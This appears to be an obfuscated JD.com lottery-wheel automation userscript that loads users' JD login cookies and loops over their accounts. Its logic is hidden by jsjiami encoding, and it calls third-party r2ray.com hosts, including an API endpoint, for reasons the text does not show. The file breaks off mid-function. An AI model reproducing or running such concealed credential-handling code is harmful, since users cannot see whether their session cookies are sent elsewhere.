/**
京东超市-大转盘
长期活动，应群友要求写了一个，但是我试了没什么收益。
活动入口：https://pro.m.jd.com/mall/active/3ryu78eKuLyY5YipWWVSeRQEpLQP/index.html
更新地址：https://share.r2ray.com/dust/i-chenzhe/z_marketLottery.js
============Quantumultx===============
[task_local]
#京东超市-大转盘
3 10 * * * https://share.r2ray.com/dust/i-chenzhe/z_marketLottery.js, tag=京东超市-大转盘,  enabled=true
================Loon==============
[Script]
cron "3 10 * * *" script-path=https://share.r2ray.com/dust/i-chenzhe/z_marketLottery.js,tag=京东超市-大转盘
===============Surge=================
京东超市-大转盘 = type=cron,cronexp="3 10 * * *",wake-system=1,timeout=3600,script-path=https://share.r2ray.com/dust/i-chenzhe/z_marketLottery.js
============小火箭=========
京东超市-大转盘 = type=cron,script-path=https://share.r2ray.com/dust/i-chenzhe/z_marketLottery.js, cronexpr="3 10 * * *", timeout=3600, enable=true
 */
const $ = new Env('京东超市-大转盘');
const notify = $.isNode() ? require('./sendNotify') : '';
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let cookiesArr = [], cookie = '';
if ($.isNode()) {
    Object.keys(jdCookieNode).forEach((item) => {
        cookiesArr.push(jdCookieNode[item])
    })
    if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => { };
} else {
    let cookiesData = $.getdata('CookiesJD') || "[]";
    cookiesData = JSON.parse(cookiesData);
    cookiesArr = cookiesData.map(item => item.cookie);
    cookiesArr.reverse();
    cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
    cookiesArr.reverse();
    cookiesArr = cookiesArr.filter(item => !!item);
}

$.log('脚本版本 v.1\n仓库：https://www.github.com/i-chenzhe/qx');

var _0xod1='jsjiami.com.v6',_0x3d4d=[_0xod1,'wq7CoxLCmg==','w7YGw5jCiQPDkeW0mOWloOaXvz5nTg==','5Lum5Lqz6La15Yyf','PcK3AwHDm8KIa8KY','Nuitv+mEjuaXqOeYkeW8o+iOoeWNnw7DqBgbJMON','HX3Ci8KRVQ==','wqzCrRg=','V8Kqw7k0','wpt+5aaw6LS/Anzlj77lmq47wqk=','PkzDn8Ohw5RwwrLDq8O0wrMeI8KIwqxDwqTCp8KlwoDCsMOZMsO/wo03EUjCjsObwobCu8KFbVPCpHpkw7o=','wrYhw5bDsGsCXcKRwrbDoCHDiQ==','w5bDozVewpzDvl7CpsOHBA==','wqHCsg/Ck1tRKiLCqcOJwprDq8Oewq3DkCHCvcKVexhiw6tiwoLDrcKLwqLDoCdIGMK3woY=','IMOLw7LCmCl5w6LCucO7ISVBwqF0YMO7wprCgMOSainCjCQ0OcKTwofCmkEgwrjDr1jCiWlQworDq8OleT7CoMKDwoB8woLCuhtJVXUNEsOrw7fCmVNGX8KvWMOrYsO9UF7CusOhw7vCuQsXKTYif8O4JcKMRRA2woI3w4gqwqfDk8KYwpMPwoDDrjnDl8OpwpPCjW7CucOIw7hqRHPCmsOdZCFARSLCgQIaQyR9FFcsTGEsFWrDrcOKZsKawp4qQDnCosKMOx8ZfcOMwpbDs8KBccO5PsKrwrgHwpTDnj3DosKDwqBwXcOyDzPClsOswpMEwoXCnhQ0GR01wrnDnRQGw4lEw7nDusOww7hWw6MIw58tw6I7Pl3Cgm8XwpfCjlUywoLDisOfQ8KIDcKQHBHCsRzDjgnClDXDuQzDpcOoOMKvw5HDq8KNw5ZvIsKxRMKEc8O9OU4rDcKuwrDCuRskwoTDg8OsC2HDglPCpcKrKmHDtsONwrZEwrrChgtEHA1YEn4CYcKkacO1VsO6w69UQcOmw7wUwrBfCcOhVWYZw5dwbsKNwowERg==','w4fCj8OEZE4=','YcOwIV7DrkEwVMOMVXfDv8ONwr0qTA==','JirDv8OvYhTDi2Vn','wp01FVZPw5/CocKC','MCMX','wpXCu8KdRsON','5b665YiZ55WO5oiK5YiF5peGw6g=','w4M/w7JxbzUSOg==','w7DDrR3DhMOvw5PDtMO+wrA=','w6bDpMOVwoNy','cTzDpynCnw==','w5YjLnrCoQ==','w60aw6kBVw==','wqNNw6Y=','VMO8wrcoGUw5wqYMw7ceXiDChm80w7ApcwR8w44VfMKxTXoFZmrCsxZDew==','L2/CoShn','wrdQw4LCnsKj','ZMKpABQs','w5ouw5rCjAs=','bsODJVvDhg==','woQ1wp8cw5w=','aEPDmMO/w5t0wqUSw6dQwrvCnFvDisKBEjU3RcOTw77DowbCs8OVwoBKwozCrMKMXsO7T8KQw7nDkmjDgQd8wpLCgAt6wo3DuWkUwoLCuUNTw6JwVXHDjsOdVwFRw7YZfmLCnsKowozCs8O3FQUcf0HChcOMwrDCgxl8w4/CuHXDuMOaeU40e8KTNsKgXDEnw57CqcKmwrBvXMOcwrEGf8Oz','w7TCgcKqe8KFw6TDhcOTQ8KeJsKJKMOLwo/ChMOMJnvDkMOZJMODwpR/eD7ChGpx','R8OZNkXDqA==','CMKQw50hwoXCnsKcworCoHzCgMOfwojCvcOmw7vCpDzCg8Kqw7rDkSNEwqEgMsOswrfCvsKnw4lRHsKEwoLDkMO8dHo=','w4V2E05mw4TCgsKfS8O6w4YzFyo2Elc4W8KRfMOWw7vDjiHCtcOHwoILC058Y8OzJn0vw7MKw67CgMOxw6bCvMK0','w60Uw6gG','w57DmsK/w5Rh','w6LDjinDocOk','w6zDgRFZw7Q=','w7Mkw7LChhM=','AcO6w4IlwpTDocKfdcKS','Q8KPw7UlXw==','HsOrw54rwo7Drg==','H8Kkw7bDh1w=','wq0Vw57Cqmc=','w7kaw68T','w5HCgsKHYFRz','woFgw43CqcKt','wroCwqE9w7w=','MlnDn8Ow','d8OhOEY=','UDvDjyzCkQ==','w5fDuws=','wpQqwroMw4E=','DcKKw7jDhQ==','acKfwrF9OMKQ','dsKKw7ArTA==','w6IIw57Clg==','wqfChcKucMOrwrfCjMONSA==','w4LDlMKq','5b6f5YmD55aC5oiD5Yin5pSNDw==','dMOhIlnDi0siVA==','wr7CjcO3w74DFDpqw5c=','w4jClMKMdXN4a1DCsw==','w4kTw4gzRQ==','w6oaw7IG','Pi0SHVFzaMK7wo3CkG9sw54LwrU3','KC0DE3FedMKc','wr7CmcKs','5byA5aWL5oi26KG+5Lm85YqD','YjfCuMO4HAHCiW0=','C8OVCcOQalfCpXjDvMKjcsOd','w5fDuBrDg8Ox','B2XCocO9Gg==','RcOmwog6GA==','UsKbFT0zwqk/P8OU','U8Kkw70/ahvDknfCng==','w70aGFrClA==','5Lu35Lqp6L+b5Zih5Lur56qH5peE5o2s','w7XDsQvDgg==','LCIoCXU=','BlPCp8OwKcO6','WsOdwo0nwpM=','OcObw7zDi0DCnH/DqEU=','d1nDiMOZw40=','VcKkw7MUTAA=','w6XDl8O3wrdi','PMK+w6s=','Y8K7wpl5wo1HwrHDiBEiw6VWTcOPw5BuwpzDhVTCocK6wrPClD/CsT7DtsO6KsKDRMKaYsK1w5gpwqzCoGXDryVTw73CuMOIwqDDrE/CvEJkWcOST2UrDWXDiTLCu8O2EDTCicKewpUhw7waCcOT','GsKfw77DjUjCqQXCnw8=','Fk3DtnoVwofCgg==','Gl3CssOGPg==','wr/Cl8K/YcOQ','wqrCncOmw6UmHiFhw7YOwq3Ctg==','QMKWCTkNwow7JcOU','wocOwpjDmMON','w6Y6EnfCgsOVwofCrg==','w47DrXbDuhRn','w7w+OHrCuQ==','OsOFf8KTBMKew5V2YUTCqyBPKnEjLsKgNiHCsm1Nwr/CtjsvOzrCucOcEsO0','ccKaJQ==','QcK7wqlDwrU=','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','bH7ClMK4w6DCpXbDkMOQw6tcw6Ixw5RRZUI=','YMKqwoh5w5Mcw7LCjhc1','woQBw5LCt2Q=','asOkMELDtxk4cMONVXfCtcKcw7drFsK/wpo5w7YLMVbCuDV4UMKGIhIuHmMZwrgnEsOTw7zCn8O/wrHCo8KAwo01w70MwoMNw6dwK0cuw5PCkU7DlkwsJRFIw58WwqnDh8OHLsKJDsO9wqLCp8KFGMOKwq8NwoI2wqPCky5Cw6/Cly0zw4RqwpXDuAdVUsKmwo7DrkzDn8Kwwr8uNEjDtsKUMSlhw4/ClVfCiWgPWcOKwqAvwqDDpsKEwppfw40wbDYzWMOXUkvDkcOCwqNsw5p8FsK9VMK2V8KWGsK/J8OSw6DCh3pfw5QvwpbCkcKRWcO9w6vCg8OlR8OtwpLCthRiSTsfwp5YwrQhBcOCwpPDoXlbwrzClyhtQcOfwotrZXc3w6zDkD4/w49EX8ONw78aw6TDvsKmc8Otd8KdGUNoXcOowrlvw51iUQDCkBLCrkPDlcOfAF3DgsOTUcKKwrDCnD/DvcOmAFhVwrnDvH5Yw41BSG3DmMO/w7puEHJ4w7sEw57CjsOXKMKbwrgsw6zCmWd6w4TDt8K4wpp1QQlnFcOyN8OiVcOsYgPDjwDDv0jDqnLCvnzDkcK9AMKCwoXDicKhwprDpi9STFXDlsOYwrppw6PCswbDgmcaFcO5w4/Di33CiULDrcKbw4XDnhx+w7Y=','JiRdG1M=','XsOnwqchV1Mhw4tIwrVFFSPDqXIxwqwuV0xhwp9cJsKVBjwZ','wrhJwqlXAMOJwro/wrFLw5lKO07CgsK8csKrwrnDvDRDwpTDqsO0SMKPw4NVB27DmSJawrIYL1t0wohdJsOPwp8ow6p0Qh/ChSfDuGMDw5XCtEPClMKgwptvwrTCqsKFwr8gw7AywpICfsOJw7QKMR5nHMK0w5MzaAwXw7sEwoTDojfCocO1RcK4OR4iDXnCjmUrw4Vbw5h2P8O8w5rDpi/CpVR6w6gVLCTDqXEkFW5Qb8Kec8KEMSo4ZsOVecKAwq7DjRZ+wrTCtkgJPDzCsW/DgS/CuHknwrIBwozCoG3DsSYOwoo5Z8Omw7zDmcKAw5UTJ1BXwrbCqcKZwr3Dt8OLPsOmwo7CsgrDkUFwwrvCtsOULXUPDR0LNsKwXxnDjTfCshNTw6LDvEUjwrvDmcOnCMOSw6MBw6vDrSNCw5nDlTXDpcKgKXTCnm/DkiDDjMOswoDCokHDmT1EQQjDi1prw7Zcw6PDmyFORnvDgUExwokJNMOzKnDDncKNw6ErwpTDnMKCw7XCssOXFMOZw4g+w6DDlMOjw63Ci8Onw5TDkX7Dihgjw5rDmFgqwoTCnnERVsKuN8KlNhxeKA9owrcPQcKha8OtLsKaw43Cp8KqwpU8w5VWwpvCqcKcDQcGJcOUPsOBM8KxcHfDtlPDiMORw5zDm8O0wrbCkMORC8KfaMKWwrvCh3AHEDMswp8GwqpTIGrCuMKiw6XCo8Kkwp7CiMOrw7jDh8Ocw4BJcsKtUMKkw6XDomY1F8OebMONB3HCtMO9wqUoEsKCw7nDjMOzwozCi8KgOsKQwqU=','CcK0Fh/DvMKKZ8KJRsKTY3EJw6EAw6LCt8KhOEUrw4LCksKtAgNJD0xkwoLDjh4=','K8OSw7DDiT/Dn3TDv0bCjDsRw7XCvh0HVg==','w67Dux3DhsKRw5HDt8OlwqPDiQ==','AsKgBwPDpcOSb8KtR8KTYztKw7VZwqfDrsK+ZRttwoHCjcOjVSoYRG1Kw4PDqjnDv8KdwoHCucOww4jDohsmw4s5SMK3R8KLw6khwocpQ8ONwp3CgsOrwolESlJYwp/CncOUwo4mJ8KMVgcCw5ROw4Ivwo4=','KcOQe8KcAsKZw5E=','XzXDswY=','wpkRwr3DgsOmwqbCjyAXwpLCjsOqFMOow69WfsOdL8OtB01zD8Oow6fDkhMKXAPCmnFPNFozwp4mLzxKwqDCnlVdw6EkFXHCocK/McOT','w5DDlnzDiSw=','wpHCl8KiTMOS','QsK9wrd9Pg==','wqUvbsOswqc=','UhvDtCzChA==','wrczN8O/wrpNw6TDp355DsKAwrLDjcONwp/DtH1zQUnDk8Obw5FrwpMVeybCo8Obw5BHw47CvF5Gw7pOOMKVS2rDrcOOwq3Dk05w','Q8OPwrE7wpLCng==','WDrDtg==','QUDCosKdwp/DgEDDqsO3w4B4w5gA','czjCvQ==','NigRCE0MbsK4wobCkHNswrFTw6huO8O0w4PDuMKPwofCoMOaScKldMOCw4N2IsKOwoDCoglrUsKqAsKTwrPDjV4ALMOdWHBoUDjCi8KlD8OAwqLCu8O6CkvCqMO1w6PCrx43w519YcOVXsO8w63DmsKeQ8OB','cTPCv8O3MRzCmw==','WMKSwqRPGQ==','PMOQe8KbDMKJw5U=','QcKLwrhI','wpkXwoLDq8Oh','BlPCpw==','wrPCtg3CllxVIjDCuQ==','wpDCo8OQwoLorZzmsbvlpZDotZfvvYborYDmo4Xmn7jnvZjotK3ph7Lorog=','OsOOw6HCmzw=','w4A2MEnCmg==','aUTDoMOgw48nw6Q=','w6zDusKnw4RA','NcOcbMKUA8Kcw5ln','5Lmn5Lui5p6f5Yit5Zi46L6j5ZqL56mi5peC5oyB','IMOHw77DvGHCjQ==','woVkw4fCk8K/','44K+5o2r56e344K26K+z5YaS6I+Q5Y+i5Lqy5Liu6Lae5Y+05LiFFMK1w7LDgMOjw6LCkeeYkOaOs+S8oueXmcKxw4rCjl7Dumvnm6HkuaXkuITnr5TlirHoj4Dljrg=','TsKOEiYMw7p9ecOCYMOiKnA6w6owI31tI8KPJS1swojDlcKScsKtwrHCjFbCn2RKfcKrw6tuwrktOBs=','w5DClMKO','w5zCq8O2wozDrQ==','w47DiT9Xw70=','M8Kvw6vCpsKKNcOYNsKjwr5iw6hDw7UlLcO9PcKwYMKGw70VRMOJCSLDplrCmsOYwrrDjD9OOBLDlcOFYyfCvMO/','w5zCh8OuwqzDn1E=','w7jDqB1Xw5c=','NsOUe8KcBQ==','w5TCicKNYlg=','YsK8wqFmwpkUw7A=','eD/CqMO4HgnCl3w=','KMOKw7LChio=','w5sxw6Y=','AS7Dl8Oiw6bCrzjlvrXlpb3jgpfkupHkuorotbLljI8=','QBbDqsKfccKiIjd8cA==','F2/Cs8KdWmNv','5Lqk5Lug6Lej5Y+5','w7QVw78XSg==','GUfDoVg1woDCgMK6','XsK8woh7wrAcw7PCgg==','wr3orqnphYzmlqrnmZjlvInoj5bljpgLw6HCvUtgAcKjwooIwotjwoIsw746JzHDjQTConJVNcODUMO5w60xFF5OVCrChhplJTo/w4F9w6jChR0=','wrMJwq8ww5E=','wo4Sw4fDokXCkQ==','w53DnsKjw4NKwrUTXXhL','jusgbujFqJNiwami.uMwgOcKoNm.v6=='];(function(_0x9a8a15,_0x264760,_0x340c3d){var _0x3151d8=function(_0x3b7fb1,_0x276cc9,_0x35bd13,_0x3d48f1,_0xffd4f0){_0x276cc9=_0x276cc9>>0x8,_0xffd4f0='po';var _0xdfeb4f='shift',_0x1751d0='push';if(_0x276cc9<_0x3b7fb1){while(--_0x3b7fb1){_0x3d48f1=_0x9a8a15[_0xdfeb4f]();if(_0x276cc9===_0x3b7fb1){_0x276cc9=_0x3d48f1;_0x35bd13=_0x9a8a15[_0xffd4f0+'p']();}else if(_0x276cc9&&_0x35bd13['replace'](/[ugbuFqJNwuMwgOKN=]/g,'')===_0x276cc9){_0x9a8a15[_0x1751d0](_0x3d48f1);}}_0x9a8a15[_0x1751d0](_0x9a8a15[_0xdfeb4f]());}return 0x76781;};return _0x3151d8(++_0x264760,_0x340c3d)>>_0x264760^_0x340c3d;}(_0x3d4d,0x14b,0x14b00));var _0x61ac=function(_0xb67384,_0x27295a){_0xb67384=~~'0x'['concat'](_0xb67384);var _0x22c9c8=_0x3d4d[_0xb67384];if(_0x61ac['AvEiUn']===undefined){(function(){var _0x35aedc=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0xa9c080='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x35aedc['atob']||(_0x35aedc['atob']=function(_0xfd277a){var _0x2048b2=String(_0xfd277a)['replace'](/=+$/,'');for(var _0x39f824=0x0,_0x23f64f,_0x172f59,_0x5489f2=0x0,_0x2ca197='';_0x172f59=_0x2048b2['charAt'](_0x5489f2++);~_0x172f59&&(_0x23f64f=_0x39f824%0x4?_0x23f64f*0x40+_0x172f59:_0x172f59,_0x39f824++%0x4)?_0x2ca197+=String['fromCharCode'](0xff&_0x23f64f>>(-0x2*_0x39f824&0x6)):0x0){_0x172f59=_0xa9c080['indexOf'](_0x172f59);}return _0x2ca197;});}());var _0x211fa3=function(_0x3d0c7c,_0x27295a){var _0x2722a3=[],_0x10a05d=0x0,_0x5b96eb,_0x86c128='',_0x3c58eb='';_0x3d0c7c=atob(_0x3d0c7c);for(var _0x1902b4=0x0,_0x462a03=_0x3d0c7c['length'];_0x1902b4<_0x462a03;_0x1902b4++){_0x3c58eb+='%'+('00'+_0x3d0c7c['charCodeAt'](_0x1902b4)['toString'](0x10))['slice'](-0x2);}_0x3d0c7c=decodeURIComponent(_0x3c58eb);for(var _0x576d89=0x0;_0x576d89<0x100;_0x576d89++){_0x2722a3[_0x576d89]=_0x576d89;}for(_0x576d89=0x0;_0x576d89<0x100;_0x576d89++){_0x10a05d=(_0x10a05d+_0x2722a3[_0x576d89]+_0x27295a['charCodeAt'](_0x576d89%_0x27295a['length']))%0x100;_0x5b96eb=_0x2722a3[_0x576d89];_0x2722a3[_0x576d89]=_0x2722a3[_0x10a05d];_0x2722a3[_0x10a05d]=_0x5b96eb;}_0x576d89=0x0;_0x10a05d=0x0;for(var _0x744bea=0x0;_0x744bea<_0x3d0c7c['length'];_0x744bea++){_0x576d89=(_0x576d89+0x1)%0x100;_0x10a05d=(_0x10a05d+_0x2722a3[_0x576d89])%0x100;_0x5b96eb=_0x2722a3[_0x576d89];_0x2722a3[_0x576d89]=_0x2722a3[_0x10a05d];_0x2722a3[_0x10a05d]=_0x5b96eb;_0x86c128+=String['fromCharCode'](_0x3d0c7c['charCodeAt'](_0x744bea)^_0x2722a3[(_0x2722a3[_0x576d89]+_0x2722a3[_0x10a05d])%0x100]);}return _0x86c128;};_0x61ac['tFkcJU']=_0x211fa3;_0x61ac['MmsNNZ']={};_0x61ac['AvEiUn']=!![];}var _0x1a36d8=_0x61ac['MmsNNZ'][_0xb67384];if(_0x1a36d8===undefined){if(_0x61ac['bnHSAP']===undefined){_0x61ac['bnHSAP']=!![];}_0x22c9c8=_0x61ac['tFkcJU'](_0x22c9c8,_0x27295a);_0x61ac['MmsNNZ'][_0xb67384]=_0x22c9c8;}else{_0x22c9c8=_0x1a36d8;}return _0x22c9c8;};!(async()=>{var _0x1976c6={'lIvGF':_0x61ac('0','DQ9R'),'sOoyL':_0x61ac('1','ERiP'),'CfEXg':function(_0x148986,_0x348f42){return _0x148986<_0x348f42;},'EnMyf':function(_0x35f6db,_0x4884c6){return _0x35f6db(_0x4884c6);},'hlAel':function(_0x2bcb9d){return _0x2bcb9d();}};if(!cookiesArr[0x0]){$[_0x61ac('2','on8K')]($['name'],_0x1976c6[_0x61ac('3','pa7G')],_0x1976c6[_0x61ac('4','Ry4P')],{'open-url':_0x61ac('5','UIMz')});return;}for(let _0x51fb09=0x0;_0x1976c6['CfEXg'](_0x51fb09,cookiesArr[_0x61ac('6','pa7G')]);_0x51fb09++){if(cookiesArr[_0x51fb09]){cookie=cookiesArr[_0x51fb09];$['UserName']=_0x1976c6[_0x61ac('7','Ry4P')](decodeURIComponent,cookie[_0x61ac('8','IYgy')](/pt_pin=(.+?);/)&&cookie['match'](/pt_pin=(.+?);/)[0x1]);$[_0x61ac('9','on8K')]=_0x51fb09+0x1;$[_0x61ac('a','@))y')]=!![];$[_0x61ac('b','rMOQ')]='';$[_0x61ac('c','%29^')]=0x0;message='';await TotalBean();console[_0x61ac('d','9Czr')](_0x61ac('e','#jQW')+$['index']+'】'+($['nickName']||$['UserName'])+_0x61ac('f',']FwT'));if(!$[_0x61ac('10','&wY4')]){$['msg']($['name'],'【提示】cookie已失效',_0x61ac('11','$(%#')+$[_0x61ac('12','O3Jy')]+'\x20'+($[_0x61ac('13','ka$n')]||$[_0x61ac('14','@))y')])+_0x61ac('15','9Czr'),{'open-url':_0x1976c6[_0x61ac('16','WA&R')]});if($[_0x61ac('17','gTaa')]()){await notify[_0x61ac('18','DQ9R')]($[_0x61ac('19','oWkt')]+_0x61ac('1a','$Rif')+$['UserName'],_0x61ac('1b','%29^')+$['index']+'\x20'+$[_0x61ac('1c','nG2U')]+_0x61ac('1d','BkFL'));}continue;}await _0x1976c6['hlAel'](jdMarket);}}})()[_0x61ac('1e','&wY4')](_0x46de48=>{$[_0x61ac('1f','oWkt')]('','❌\x20'+$[_0x61ac('20','uBN!')]+_0x61ac('21','9Czr')+_0x46de48+'!','');})['finally'](()=>{$['done']();});async function jdMarket(){var _0x3c41f7={'OAdzr':function(_0xeaa84f){return _0xeaa84f();},'LhgJh':_0x61ac('22','P]Ns'),'aocqL':_0x61ac('23','fZrk'),'xrCfK':'application/x-www-form-urlencoded','BSfBS':'https://h5.m.jd.com','OGmna':'gzip,\x20deflate,\x20br','nCtiA':_0x61ac('24','Ry4P'),'fRjSq':_0x61ac('25','oWkt'),'DhxmQ':_0x61ac('26','%29^'),'GYgwo':_0x61ac('27','on8K'),'QGAwE':'https://api.r2ray.com/jd.bargain/done','fMEdy':_0x61ac('28','MT%7'),'GMVDu':'获取活动信息成功','vOzcz':function(_0x84b4d8,_0x5ba1db){return _0x84b4d8<_0x5ba1db;},'NBLQE':_0x61ac('29','rMOQ'),'moOOf':function(_0x281d00,_0x276fe4,_0x4ba86a){return _0x281d00(_0x276fe4,_0x4ba86a);},'vMOCl':function(_0x32d3f0,_0x3b3d5f){return _0x32d3f0===_0x3b3d5f;},'pdnFT':function(_0x139495,_0x4209a6){return _0x139495/_0x4209a6;},'ThSAw':function(_0x3ed404,_0x22e91b,_0x8387b7,_0x313367){return _0x3ed404(_0x22e91b,_0x8387b7,_0x313367);},'xFIUz':'babelGetLottery'};await _0x3c41f7['OAdzr'](getActInfo);if($[_0x61ac('2a','kz!]')]){$[_0x61ac('2b',')6Qh')](_0x3c41f7[_0x61ac('2c','XVJ4')]);$[_0x61ac('2b',')6Qh')](_0x61ac('2d','kz!]')+$[_0x61ac('2e','9Czr')][_0x61ac('2f','2DPf')]+'\x0a');}if(!![]){function _0x3f19b9(){var _0x40b1a4={'ekOJT':function(_0x53264e){return _0x3c41f7[_0x61ac('30','#*p7')](_0x53264e);},'DxOfo':_0x3c41f7[_0x61ac('31','bLn5')]};return new Promise(_0x228860=>{$['get']({'url':_0x40b1a4[_0x61ac('32','e*C!')]},(_0x34582b,_0x2db909,_0x43d65f)=>{try{if(_0x43d65f){$['zData']=JSON[_0x61ac('33','O3Jy')](_0x43d65f);};}catch(_0xf0f958){console[_0x61ac('34','Tt8a')](_0xf0f958);}finally{_0x40b1a4['ekOJT'](_0x228860);};});});}function _0x3d77a1(_0x5e595b,_0x46de11){var _0x10cc05={'gPQWX':function(_0x2231de){return _0x2231de();}};let 